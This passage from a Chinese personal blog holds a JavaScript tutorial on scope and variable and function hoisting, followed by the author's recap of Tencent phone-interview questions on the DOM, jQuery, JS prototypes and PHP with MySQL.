<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> a=<span class="string">'One'</span>; </span><br><span class="line"><span class="keyword">var</span> b=<span class="string">'Two'</span>; </span><br><span class="line"><span class="keyword">var</span> c=<span class="string">'Three'</span>; </span><br><span class="line">&lt;/script&gt;</span><br><span class="line"><span class="comment">//实际上相当于</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> a,b,c;</span><br><span class="line">a=<span class="string">'One'</span>;</span><br><span class="line">b=<span class="string">'Two'</span>;</span><br><span class="line">c=<span class="string">'Three'</span>;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>这是js的内部机制决定的，我们没法改变所以在实际使用中一定要注意。</p>
<h3 id="1-作用域"><a href="#1-作用域" class="headerlink" title="1. 作用域"></a>1. 作用域</h3><p>在实际讨论提升问题前先要弄清楚js的作用域的问题。js的作用域不同于C语言，在<br>C家族编程语言中，变量是遵循块作用域(block-level scope)的，看一下例子<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">    <span class="keyword">int</span> x = <span class="number">1</span>;  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d, "</span>, x); <span class="comment">// 1  </span></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">1</span>) &#123;  </span><br><span class="line">        <span class="keyword">int</span> x = <span class="number">2</span>;  </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d, "</span>, x); <span class="comment">// 2  </span></span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, x); <span class="comment">// 1  </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>C语言在解析变量时是以块作用域来声明的，只有进入一个块(比如 if 块)只有作用域该块的<br>变量才能声明并且不会影响到块外的数据(比如形参和实参的互不影响)。</p>
<p><b>但是</b>，js并不是这样处理的，js是函数级作用域(function-level scope)，也就是进入<br>块并不会创建一个新的作用域，只有使用函数才会创建一个新的作用域。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;  <span class="comment">//函数声明是一个域。</span></span><br><span class="line"><span class="keyword">var</span> x = <span class="number">1</span>; </span><br><span class="line"><span class="keyword">if</span> (x) &#123; </span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; <span class="comment">//函数声明再创建一个新的作用域，与包含函数的作用域不是一个域</span></span><br><span class="line">                <span class="comment">//如果要相互之间传参就涉及到了闭包的问题了。</span></span><br><span class="line"><span class="keyword">var</span> x = <span class="number">2</span>; </span><br><span class="line"><span class="comment">// some other code </span></span><br><span class="line">&#125;()); </span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// x is still 1.  //所以上边函数的作用域不会影响原本的x</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="2-变量提升"><a href="#2-变量提升" class="headerlink" title="2.变量提升"></a>2.变量提升</h3><p>先介绍变量提升。很简单，就是把变量提升提到函数的顶部(如果是全局的实际上也是一个大的函数)。需要说明的是，<br>变量提升只是提升变量的声明，并不会把赋值也提升上来。例如：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(a);<span class="comment">// undefined</span></span><br><span class="line"><span class="keyword">var</span> a=<span class="number">1</span>;</span><br><span class="line"><span class="built_in">console</span>.log(a); <span class="comment">// 1</span></span><br></pre></td></tr></table></figure></p>
<p>另外补充一下<br>在javascript，变量有4种基本方式进入作用域：<br>1 语言内置：所有的作用域里都有this和arguments；(arguments在全局作用域是不可见的)<br>2 形式参数：函数的形式参数会作为函数体作用域的一部分；<br>3 函数声明：像这种形式：function foo(){}；<br>4 变量声明：像这样：var foo；<br>并且无论定义该变量的块是否能被执行，都会被提升<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="literal">false</span>)</span><br><span class="line">    &#123; <span class="keyword">var</span> x =<span class="number">1</span>;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//等于</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> x;</span><br><span class="line">    <span class="keyword">if</span>(<span class="literal">false</span>)</span><br><span class="line">    &#123; x =<span class="number">1</span>;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>所以为了代码能正确运行，建议把要用到的变量都手动的提升到顶部，出bug时调试能够更明确。</p>
<p>再测试一下<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">false</span>) &#123; <span class="keyword">var</span> a = <span class="number">1</span>; &#125; <span class="built_in">console</span>.log(a); </span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">       <span class="keyword">if</span>(!(<span class="string">"a"</span> <span class="keyword">in</span> <span class="built_in">window</span>)) &#123; a = <span class="number">1</span> &#125; <span class="built_in">console</span>.log(a); </span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">      <span class="built_in">console</span>.log(a);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<p>答案为:<span style="color:red">undefined , 1 , ReferenceError: a is not defined  </span><br>其中第二题要考虑过程，一开始a并没有通过var声明于是作用域没有将它提升，所以if判断true进入内部，<br>此时赋予a值，于是a=1；</p>
<p>补充，使不使用var来定义变量有很大的区别<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">alert(a);  </span><br><span class="line"><span class="keyword">var</span> a=<span class="number">1</span>;  </span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">alert(a);</span><br><span class="line">a=<span class="number">1</span>;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<p>第二个会报错，因为在 a=1 之前并没有 a 的声明，所以报错找不到 a 等到 a = 1 才会即时把<br>a 加入到 window 里。</p>
<h3 id="3-函数提升"><a href="#3-函数提升" class="headerlink" title="3.函数提升"></a>3.函数提升</h3><p>类似于变量提升，函数提升也是把函数声明提升到顶部，也要考虑作用域的问题，定义在<br>一个函数内部的函数只会提升到该函数的顶部不会提升到全局。<br>例如：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sayHi();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sayHi</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"hi"</span>);</span><br><span class="line">&#125;<span class="comment">//并不会说找不到函数，因为sayHi被提升到顶部了</span></span><br></pre></td></tr></table></figure></p>
<p>定义函数有两种方式：一种是函数申明，另一种是函数表达式。<br>函数声明形式：function functionName(arg0, arg1, arg2) { //函数体 }<br>函数表达式形式：var functionName = function(arg0, arg1, arg2) { //函数体 }<br><b>注意</b> 能够被提升的只有函数声明形式，表达式形式并不能被提升。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myTest</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">foo(); <span class="comment">//提升成功，因为是声明形式</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">alert(<span class="string">"我来自 foo"</span>); </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line">myTest();  </span><br><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">function myTest()&#123; </span><br><span class="line">foo();  //提升失败因为是表达式形式不能被提升，报错foo is not a function</span><br><span class="line">var foo =function foo()&#123; </span><br><span class="line">alert("我来自 foo"); </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line">myTest(); </span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>同样的不受块影响，只要声明了一定会提升</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!(<span class="string">"a"</span> <span class="keyword">in</span> <span class="built_in">window</span>)) </span><br><span class="line">&#123; <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>) </span>&#123; <span class="built_in">window</span>.a = <span class="number">1</span>; &#125;&#125; </span><br><span class="line"><span class="built_in">console</span>.log(a); <span class="comment">//function a()&#123; ... &#125;</span></span><br></pre></td></tr></table></figure>
<p>练习：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;  </span><br><span class="line">    foo(); <span class="comment">// TypeError "foo is not a function"  </span></span><br><span class="line">    bar(); <span class="comment">// "this will run!"  </span></span><br><span class="line">    <span class="keyword">var</span> foo = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; <span class="comment">// 变量指向函数表达式  </span></span><br><span class="line">        alert(<span class="string">"this won't run!"</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params"></span>) </span>&#123; <span class="comment">// 函数声明 函数名为bar  </span></span><br><span class="line">        alert(<span class="string">"this will run!"</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">test();</span><br></pre></td></tr></table></figure></p>
<h3 id="4-变量提升与函数提升的比较"><a href="#4-变量提升与函数提升的比较" class="headerlink" title="4.变量提升与函数提升的比较"></a>4.变量提升与函数提升的比较</h3><p>既然两者都会提升，那么必然会引发优先级的问题，js的机制十分明确：<br>赋值&gt;函数声明&gt;变量声明<br>看例子来体会：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(a);<span class="comment">//function a()&#123;&#125;</span></span><br><span class="line"><span class="keyword">var</span> a=<span class="number">1</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line"><span class="built_in">console</span>.log(a);<span class="comment">// 1</span></span><br></pre></td></tr></table></figure></p>
<p>首先因为js规定了函数声明优先于var声明，所以会覆盖var a的声明所以第一个输出为function a<br>而中间因为给 a 赋值了1，所以function a 被覆盖了，所以第二个显示 1 。</p>
<p>练习：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>) </span>&#123; <span class="keyword">return</span> <span class="literal">false</span>; &#125;</span><br><span class="line"><span class="keyword">var</span> s = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>(a()) &#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(a);</span><br><span class="line">      <span class="comment">//上述代码输出的a值为：function a() &#123; return false; &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>) </span>&#123; <span class="keyword">return</span> <span class="literal">true</span>; &#125;</span><br><span class="line"><span class="keyword">var</span> s = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>(a()) &#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(a);</span><br><span class="line">      <span class="comment">//上述代码输出的a值为：1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>) </span>&#123; <span class="keyword">return</span> <span class="literal">true</span>; &#125;</span><br><span class="line"><span class="keyword">var</span> a;</span><br><span class="line"><span class="keyword">var</span> s = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>(a()) &#123;</span><br><span class="line">    a = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(a);</span><br><span class="line">      <span class="comment">//上述代码输出的a值为：1</span></span><br></pre></td></tr></table></figure></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>看完了js的变量提升和函数提升，知道了js是如何处理变量声明和函数声明以及处理的优先级。<br>所以在以后写js代码时要注意变量的作用域，尽可能把要用到的变量都手动的写道顶部可以避免<br>一些逻辑上的错误，在嵌套函数时候要知道如何使用作用域不干扰外部的变量。</p>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">


  <div class="article-tags">
  
  <span></span> <a href="/tags/js/">js</a>
  </div>

</div>




<div class="comments-count">
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand post" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2016/04/11/review/" title="鹅厂一面问题总结" itemprop="url">鹅厂一面问题总结</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="lianMo" target="_blank" itemprop="author">lianMo</a>
		
  <p class="article-time">
    <time datetime="2016-04-11T14:23:29.000Z" itemprop="datePublished"> 发表于 2016-04-11</time>
    
  </p>
</header>
    <div class="article-content">
        
        <p>昨天被鹅厂一面了，在看着动画时突然打电话来面试，为什么只有我是电话面试的…..<br>算了反正都面试过了，到写下这篇博客时查询状态还是查无结果，难道我的记录消失在宇宙中了吗….<br>算了就算挂了也算是一次经验的积累，不过昨天实在紧张到懵逼了，有好几个问题都会的却漏答了…<br>算了还是先来总结一下吧，自己会的和不会的估计各占一半吧，猜测是电话面试的原因，没有怎么让我<br>展开自己的项目而是一直在问基础，好吧，因面试官而异，废话差不多了，进入正题。</p>
<h4 id="1-js的面向对象编程思想"><a href="#1-js的面向对象编程思想" class="headerlink" title="1.js的面向对象编程思想"></a>1.js的面向对象编程思想</h4><p>这个我没有答好…因为没抓住面试官的意图，臆测要回答得很高端的，于是乱来了….<br>实际上就是考面向对象编程的思想，从封装性，继承性，多态性方面展开讲，以及把所有逻辑当作<br>对象处理的思想。</p>
<h4 id="2-DOM的属性"><a href="#2-DOM的属性" class="headerlink" title="2.DOM的属性"></a>2.DOM的属性</h4><p>这个也是懵逼了，一时间答不上来…<br>document.title //设置文档标题等价于HTML的title标签<br>document.bgColor //设置页面背景色<br>document.fgColor //设置前景色(文本颜色)<br>document.linkColor //未点击过的链接颜色<br>document.alinkColor //激活链接(焦点在此链接上)的颜色<br>document.vlinkColor //已点击过的链接颜色<br>document.URL //设置URL属性从而在同一窗口打开另一网页<br>document.fileCreatedDate //文件建立日期，只读属性<br>document.fileModifiedDate //文件修改日期，只读属性<br>document.charset //设置字符集 简体中文:gb2312<br>document.fileSize //文件大小，只读属性<br>document.cookie //设置和读出cookie<br>document.referrer //读出前一页的URL</p>
<p>常用对象方法</p>
<p>document.write() //动态向页面写入内容<br>document.createElement(Tag) //创建一个html标签对象<br>document.getElementById(ID) //获得指定ID值的对象<br>document.getElementsByName(Name) //获得指定Name值的对象集合<br>document.getElementsByTagName(Tag) //获得指定tag值的对象集合<br>document.body.appendChild(oTag)</p>
<h4 id="3-获取DOM的方法"><a href="#3-获取DOM的方法" class="headerlink" title="3.获取DOM的方法"></a>3.获取DOM的方法</h4><p>document.getElementById(ID)<br>document.getElementsByName(Name)<br>document.getElementsByTagName(Tag)</p>
<p>jq的方法<br>$(selector)  // 多对象可以通过 $(selector)[1] $(selector).toArray() $(selector).get(1)来获得</p>
<p>等下拓展一下get()方法因为后边有个问题也用到了。</p>
<p>html5新增的方法</p>
<p>document.getElementsByClassName(class)</p>
<p>querySelector()方法 ：接收一个CSS选择符 ，返回与该模式匹配的第一个元素，若没有匹配到返回null。<br>其中通过Document类型调用querySelector()方法时，会在文档元素范围内查找匹配元素；<br>如var body =  document.querySelector(“body”);<br>通过Element类型调用querySelector()时，只会在该元素后代元素的范围内查找匹配元素<br>如var img = document.body.querySelector(“img.button”);</p>
<p>querySelectorAll()方法 ：接收一个CSS选择符 ，返回与该模式匹配的所有元素，返回一个Nodelist实例（类Array）若没有匹配到返回null。<br>所以可以使用Array的一些熟悉如item() [] length</p>
<p>matchesSelector()方法：接收一个css选择符，如果调用元素与该选择符匹配，返回true。否则返回false.</p>
<h4 id="4-jq获得的对象是否原生的DOM对象"><a href="#4-jq获得的对象是否原生的DOM对象" class="headerlink" title="4. jq获得的对象是否原生的DOM对象"></a>4. jq获得的对象是否原生的DOM对象</h4><p>否定。<br>jQuery 对象是通过 jQuery 包装DOM 对象后产生的对象。jQuery 对象是 jQuery 独有的，其可以使用 jQuery 里的方法，但是不能使用 DOM 的方法；例如： $(“#img”).attr(“src”,”test.jpg”); 这里的 $(“#img”)就是 jQuery 对象。<br>DOM对象就是Javascript 固有的一些对象操作。DOM 对象能使用Javascript 固有的方法，但是不能使用 jQuery 里的方法。例如：document.getElementById(“img”).src = “test.jpg”；这里的document.getElementById(“img”) 就是DOM 对象。<br>$(“#img”).attr(“src”,”test.jpg”); 和 document.getElementById(“img”).src = “test.jpg”; 是等价的，是正确的，但是 $(“#img”).src = “test.jpg” ；或者 document.getElementById(“img”).attr(“src”,”test.jpg”); 都是错误的。</p>
<h4 id="5-jq获得的DOM对象与原生DOM对象的转换"><a href="#5-jq获得的DOM对象与原生DOM对象的转换" class="headerlink" title="5. jq获得的DOM对象与原生DOM对象的转换"></a>5. jq获得的DOM对象与原生DOM对象的转换</h4><p>这个不会啊，之前没接触过….<br>对于已经是一个 DOM 对象，只需要用 $() 把DOM对象包装起来，就可以获得一个 jQuery 对象了，使用[index]和.get(index)可以转为DOM对象</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> dom1 = <span class="built_in">document</span>.getElementById(<span class="string">'id1'</span>);</span><br><span class="line"><span class="keyword">var</span> jq1 = $(<span class="string">"#id2"</span>);</span><br><span class="line"><span class="keyword">var</span> dom2 = jq1.get(<span class="number">0</span>) <span class="comment">// 或者 jq1[0] jq1.get()[0]</span></span><br><span class="line"><span class="keyword">var</span> jq2 = $(dom1)</span><br></pre></td></tr></table></figure>
<p>注意在jq中不带DOM的get是类似于ajax的缩写方式，官方描述：<b>使用一个HTTP GET请求从服务器加载数据。</b></p>
<p>jQuery.get( url [, data ] [, success(data, textStatus, jqXHR) ] [, dataType ] )</p>
<p>url<br>类型: String<br>一个包含发送请求的URL字符串<br>data<br>类型: PlainObject, String<br>发送给服务器的字符串或Key/value键值对。<br>success(data, textStatus, jqXHR)<br>类型: Function()<br>当请求成功后执行的回调函数。 如果提供dataType选项，那么这个success选项是必须的， 但你可以使用null或jQuery.noop作为占位符。<br>dataType<br>类型: String<br>从服务器返回的预期的数据类型。默认：智能猜测（xml, json, script, 或 html）。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$.get(<span class="string">'ajax/test.html'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">  $(<span class="string">'.result'</span>).html(data);</span><br><span class="line">  alert(<span class="string">'Load was performed.'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">//效果与ajax相同</span></span><br><span class="line">$.ajax(&#123;</span><br><span class="line">  url: <span class="string">'ajax/test.html'</span>,</span><br><span class="line">  type：get,  </span><br><span class="line">  success: <span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123; $(<span class="string">'.result'</span>).html(data);</span><br><span class="line">                             alert(<span class="string">'Load was performed.'</span>);&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h4 id="6-js的数据类型"><a href="#6-js的数据类型" class="headerlink" title="6. js的数据类型"></a>6. js的数据类型</h4><p>这个也是紧张到懵逼忘记了布尔，数组和对象…<br>字符串、数字、布尔、数组、对象、Null、Undefined</p>
<h4 id="7-js的原型的概念"><a href="#7-js的原型的概念" class="headerlink" title="7. js的原型的概念"></a>7. js的原型的概念</h4><p>没有发挥好…明明脑子里知道是什么却没法很好地表达，不知道对方get到多少了…<br>因为js是面向对象的编程，所以每个东西都是一个对象，相对于java的object基类，js就是原型，<br>原型对象可以看做是一个类，定义了实例化的对象具有的属性和函数。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">A</span>(<span class="params"></span>)</span>&#123;&#125; <span class="comment">//定义一个构造函数就有一种新的类，每种类都有一个prototype</span></span><br><span class="line">A.prototype.show = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="comment">//do something&#125; //给这个类绑定函数</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> A();</span><br><span class="line">a.show(); <span class="comment">// 这类的实例化对象可以使用原型的函数。</span></span><br></pre></td></tr></table></figure></p>
<h4 id="8-js的Number数据和对象Object的区别"><a href="#8-js的Number数据和对象Object的区别" class="headerlink" title="8. js的Number数据和对象Object的区别"></a>8. js的Number数据和对象Object的区别</h4><p>Number虽然是基本数据类型，但很明显也是一种类，那么跟Object类型的数据又有什么区别呢？<br>为什么在数据类型划分时要分开？<br>这个我没有考虑过也就没有答好，只能糊弄的说一个是系统自带的类一个是专指自定义的。感觉应该不对。</p>
<p>w3c上有这样一段话：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">在 JavaScript 中，数字是一种基本的数据类型。JavaScript 还支持 Number 对象，</span><br><span class="line">该对象是原始数值的包装对象。在必要时，JavaScript 会自动地在原始数据和对象之间转换。</span><br><span class="line">在 JavaScript 1.1 中，可以用构造函数 Number() 明确地创建一个 Number 对象，</span><br><span class="line">尽管这样做并没有什么必要。</span><br></pre></td></tr></table></figure></p>
<p>只能说数值型数据也是对象，但是是经过拓展的新的类型，Number对象，也就是子类不等于父类，<br>但是来源于父类。</p>
<h4 id="9-php-的require-和-require-once-的区别和各自的优势"><a href="#9-php-的require-和-require-once-的区别和各自的优势" class="headerlink" title="9. php 的require() 和 require_once()的区别和各自的优势"></a>9. php 的require() 和 require_once()的区别和各自的优势</h4><p>区别很简单，require会引起重复引用的问题，require_once()只引用一次，防止出错。<br>但是优势了….当时没怎么想象就放弃了，真实失策啊…明明联想一下C++的预编译就行了。<br>类似于预编译的效率问题，require不需要查找重复项效率高，require_once就效率低了</p>
<p>所以正确回答是根据场景不同使用不同方法，在单一引用确定没有重复引用时使用require提高效率<br>如果有重复引用就用require_once防止出错。</p>
<h4 id="10-php-连接-mysql"><a href="#10-php-连接-mysql" class="headerlink" title="10. php 连接 mysql"></a>10. php 连接 mysql</h4><p>记忆开始模糊了，就记得这么多了…<br>这个就没什么了，只是没听清他问的是具体到连接数据库还是只需要连接mysql….<br>又没有重复确认，电话面试好难听清楚啊…..所以各位一定要冷静可以大胆复述问题确认没有听错。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$conn = mysql_connect(severaddress,username,password); <span class="comment">//连接到mysql</span></span><br><span class="line">mysql_select_db(dbname,$conn); <span class="comment">//连接到具体数据库</span></span><br></pre></td></tr></table></figure></p>
<p>拓展，查了w3c还有两个参数可以用，但是不影响连接成功，但是一般考虑安全可能需要用到，<br>估计我没答上来就被扣分了吧…..<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_connect(server,user,pwd,newlink,clientflag);<span class="comment">//newlink 和clientflag以前没关注过下面解释</span></span><br></pre></td></tr></table></figure></p>
<tr><br>    <td>参数</td><br>    <td>描述</td><br>  </tr><br>  <tr><br>    <td>server</td><br>    <td><br>    <p>可选。规定要连接的服务器。</p><br>    <p>可以包括端口号，例如 “hostname:port”，或者到本地套接字的路径，例如对于 localhost 的 “:/path/to/socket”。</p><br>    <p>如果 PHP 指令 mysql.default_host 未定义（默认情况），则默认值是 ‘localhost:3306’。</p><br>    </td><br>  </tr><br>  <tr><br>    <td>user</td><br>    <td>可选。用户名。默认值是服务器进程所有者的用户名。</td><br>  </tr><br>  <tr><br>    <td>pwd</td><br>    <td>可选。密码。默认值是空密码。</td><br>  </tr><br>  <tr><br>    <td>newlink</td><br>    <td>可选。如果用同样的参数第二次调用 mysql_connect()，将不会建立新连接，而将返回已经打开的连接标识。参数 new_link 改变此行为并使 mysql_connect() 总是打开新的连接，甚至当 mysql_connect() 曾在前面被用同样的参数调用过。</td><br>  </tr><br>  <tr><br>    <td>clientflag</td><br>    <td><br>    <p>可选。client_flags 参数可以是以下常量的组合：</p><br>    <ul class="listintable"><br>        <li>MYSQL_CLIENT_SSL - 使用 SSL 加密</li><br>        <li>MYSQL_CLIENT_COMPRESS - 使用压缩协议</li><br>        <li>MYSQL_CLIENT_IGNORE_SPACE - 允许函数名后的间隔</li><br>        <li>MYSQL_CLIENT_INTERACTIVE - 允许关闭连接之前的交互超时非活动时间</li><br>    </ul><br>    </td><br>  </tr>


<p>可能还有遗漏等我想起就补上吧，现在还没有消息估计是没戏了，叹一声长气，唉~~~~</p>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">


  <div class="article-tags">
  
  <span></span> <a href="/tags/面试/">面试</a>
  </div>

</div>




<div class="comments-count">
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand post" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
